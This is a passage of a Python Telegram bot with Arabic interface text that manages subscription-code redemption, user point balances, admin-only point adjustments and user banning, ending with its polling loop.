    except:
        bot.reply_to(message, "❌ خطأ: /code عدد_الساعات\nأو /code عدد_الساعات user_id")

# ==================== أمر /redeem ====================
@bot.message_handler(commands=["redeem"])
def redeem(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    try:
        code = message.text.split(' ')[1]
        success, msg = redeem_code(code, user_id)
        if success:
            expiry = load_subscriptions().get(str(user_id), "غير معروف")
            bot.reply_to(message, f"✅ {msg}\n📅 ينتهي في: {expiry}\n💡 أثناء الاشتراك لن تستهلك نقاطك", parse_mode="HTML")
        else:
            bot.reply_to(message, f"❌ {msg}", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ خطأ: /redeem الكود")

# ==================== أوامر النقاط ====================
@bot.message_handler(commands=["addpoints"])
def add_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        add_points(user_id, amount)
        bot.reply_to(message, f"✅ تم إضافة {amount} نقطة للمستخدم {user_id}\nالرصيد الحالي: {get_points(user_id)}")
    except:
        bot.reply_to(message, "❌ خطأ: /addpoints ID عدد")

@bot.message_handler(commands=["rempoints"])
def rem_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        current = get_points(user_id)
        new_amount = max(0, current - amount)
        set_points(user_id, new_amount)
        bot.reply_to(message, f"✅ تم حذف {amount} نقطة من المستخدم {user_id}\nالرصيد الحالي: {get_points(user_id)}")
    except:
        bot.reply_to(message, "❌ خطأ: /rempoints ID عدد")

@bot.message_handler(commands=["setpoints"])
def set_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        set_points(user_id, amount)
        bot.reply_to(message, f"✅ تم تعيين رصيد {amount} نقطة للمستخدم {user_id}")
    except:
        bot.reply_to(message, "❌ خطأ: /setpoints ID عدد")

@bot.message_handler(commands=["mypoints"])
def my_points_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    if has_active_subscription(user_id):
        expiry = load_subscriptions().get(str(user_id), "غير معروف")
        points = get_points(user_id)
        bot.reply_to(message, f"💰 لديك اشتراك نشط حتى {expiry}\n📊 نقاطك المحفوظة: {points} نقطة\n💡 ملاحظة: أثناء الاشتراك لا تستهلك نقاطك")
    else:
        points = get_points(user_id)
        bot.reply_to(message, f"💰 رصيدك الحالي: {points} نقطة")

@bot.message_handler(commands=["points"])
def points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        points = get_points(user_id)
        if has_active_subscription(user_id):
            expiry = load_subscriptions().get(str(user_id), "غير معروف")
            bot.reply_to(message, f"💰 رصيد المستخدم {user_id}: {points} نقطة\n✅ لديه اشتراك نشط حتى {expiry}")
        else:
            bot.reply_to(message, f"💰 رصيد المستخدم {user_id}: {points} نقطة")
    except:
        bot.reply_to(message, "❌ خطأ: /points ID")

# ==================== أوامر الحظر ====================
@bot.message_handler(commands=["block"])
def block_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        ban_user(user_id)
        bot.reply_to(message, f"✅ تم حظر المستخدم {user_id}")
        try:
            bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ خطأ: /block ID")

@bot.message_handler(commands=["unblock"])
def unblock_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        unban_user(user_id)
        bot.reply_to(message, f"✅ تم إلغاء حظر المستخدم {user_id}")
        try:
            bot.send_message(user_id, "✅ تم إلغاء حظرك، يمكنك استخدام البوت الآن.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ خطأ: /unblock ID")

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(15)
